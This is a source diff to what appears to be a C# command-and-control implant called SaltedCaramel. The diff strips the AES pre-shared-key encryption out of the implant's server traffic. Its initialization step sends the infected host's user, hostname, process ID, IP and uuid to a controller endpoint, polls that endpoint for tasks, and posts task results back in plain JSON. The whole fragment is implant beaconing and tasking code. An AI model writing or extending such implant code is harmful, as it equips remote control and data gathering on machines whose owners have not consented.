@@ -75,8 +75,7 @@ namespace SaltedCaramel
             {
                 // Encrypt json to send to server
                 string json = JsonConvert.SerializeObject(taskresp);
-                string encrypted = crypto.Encrypt(json);
-                string result = crypto.Decrypt(HTTP.Post(endpoint, encrypted));
+                string result = HTTP.Post(endpoint, json);
                 Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.id}: {result}");
                 if (result.Contains("success"))
                     // If it was successful, return the result
@@ -124,18 +123,14 @@ namespace SaltedCaramel
             string initEndpoint = this.endpoint + "crypto/aes_psk/" + this.uuid;
             this.retry = 0;
 
-            crypto.PSK = this.PSK;
             try // Try block for HTTP request
             {
                 // Get JSON string for implant
                 // Format: {"user":"username", "host":"hostname", "pid":<pid>, "ip":<ip>, "uuid":<uuid>}
                 string json = JsonConvert.SerializeObject(this);
                 Debug.WriteLine($"[+] InitializeImplant - Sending {json} to {initEndpoint}");
-
-                // Encrypt json to send to server
-                string encrypted = crypto.Encrypt(json);
                 
-                string result = crypto.Decrypt(HTTP.Post(initEndpoint, encrypted));
+                string result = HTTP.Post(initEndpoint, json);
 
                 if (result.Contains("success"))
                 {
@@ -181,7 +176,7 @@ namespace SaltedCaramel
                 {
                     try // Try block for HTTP request
                     {
-                        SCTask task = JsonConvert.DeserializeObject<SCTask>(crypto.Decrypt(HTTP.Get(taskEndpoint)));
+                        SCTask task = JsonConvert.DeserializeObject<SCTask>(HTTP.Get(taskEndpoint));
                         retry = 0;
                         if (task.command != "none")
                             Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
